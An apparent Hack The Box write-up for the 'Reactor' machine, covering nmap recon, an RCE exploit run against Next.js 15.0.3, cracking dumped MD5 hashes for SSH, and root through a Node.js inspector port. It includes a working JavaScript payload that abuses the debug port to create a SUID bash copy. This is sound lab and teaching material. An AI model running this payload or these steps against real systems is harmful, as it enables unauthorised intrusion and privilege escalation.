---
title: Reactor
date: 2026-05-24
description: Easy Linux machine exposing a Next.js 15.0.3 application vulnerable to CVE-2025-55182 (React2Shell) for unauthenticated RCE, cracking unsalted MD5 credentials from SQLite for SSH access, and abusing a Node.js inspector debug port for root.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.95 scan initiated Sun May 24 14:58:51 2026 as: /usr/lib/nmap/nmap -sV -sC -oN Scan_results.txt 10.129.129.153
Nmap scan report for reactor.htb (10.129.129.153)
Host is up (1.3s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sun, 24 May 2026 13:34:00 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></scr​ipt><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></scr​ipt><script s
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 24 May 2026 13:34:07 GMT
|     Connection: close
|   Help, NCP: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 24 May 2026 13:34:10 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=5/24%Time=6A12FD2A%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,247A,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Ro
SF:uter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefet
SF:ch,\x20Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:
SF:\x201\r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.j
SF:s\r\nCache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd
SF:8t\"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x2017175\r\nDate:\x20Sun,\x2024\x20May\x202026\x2013:34:00\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head
SF:><meta\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"wi
SF:dth=device-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20
SF:href=\"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"n
SF:ext\"/><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low
SF:\"\x20href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><scri
SF:pt\x20src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20asy
SF:nc=\"\"></scr​ipt><script\x20src=\"/_next/static/chunks/517-d083b552e04d
SF:ead1\.js\"\x20async=\"\"></scr​ipt><script\x20s")%r(Help,2F,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTT
SF:POptions,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Ne
SF:xt-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-P
SF:refetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private
SF:,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x
SF:20Sun,\x2024\x20May\x202026\x2013:34:07\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary
SF::\x20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-R
SF:outer-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Cont
SF:rol:\x20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revali
SF:date\r\nDate:\x20Sun,\x2024\x20May\x202026\x2013:34:10\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 24 15:00:34 2026 -- 1 IP address (1 host up) scanned in 103.41 seconds
```
The `fingerprint-strings` on port `3000` identified **Next.js version 15.0.3**.

# User

## React2Shell

Next.js 15.0.3 is vulnerable to **CVE-2025-55182** — an unauthenticated RCE in the React Server Components Flight protocol deserializer:

```bash
source ~/venv/bin/activate
python3 exploit.py -u https://example.com -c "id"
```

Shell captured as `node`, and `reactor.db` in the application directory held user credentials:

| ID  | Username | Password Hash                    | Role          | Email                |
| --- | -------- | -------------------------------- | ------------- | -------------------- |
| 5   | engineer | 39d97110eafe2a9a68639812cd271e8e | operator      | engineer@reactor.htb |
| ?   | admin    | a203b22191d744a4e70ada5c101b17b8 | administrator | admin@reactor.htb    |

The unsalted MD5 hash for `engineer` cracked to:

```text
engineer : reactor1
```

# Root

Process listing revealed a Node.js instance running with the **inspector** enabled, opening debug port `9229` on localhost — allowing remote code execution through Chrome DevTools Protocol.

The port was only bound locally, so an SSH tunnel forwarded it out:

```bash
ssh -L 9229:localhost:9229 engineer@reactor1
```

Reach the debugger with `chrome-remote-interface` and inject a payload:

```javascript
const CDP = require('chrome-remote-interface');

async function exp() {
    let client;
    try {
        client = await CDP({ port: 9229 });
        const { Runtime } = client;
        const payload = `
            (() => {
                const proc = process || global.process;
                const req = proc.mainModule.require;
                const cp = req('child_process');
                cp.execSync(
                    'cp /bin/bash /tmp/root && chmod +s /tmp/root'
                );
                return 'Completed';
            })()
        `;
        const response = await Runtime.evaluate({
            expression: payload,
            returnByValue: true
        });
        console.log(response.result.value);
    } catch (err) {
        console.error(err.message);
    } finally {
        if (client) {
            await client.close();
        }
    }
}
exp();
```

The injected code copied `/bin/bash` to `/tmp/root` and set the SUID bit — executing it with `-p` preserves elevated privileges.

```bash
/tmp/root -p
```

Gained `root`
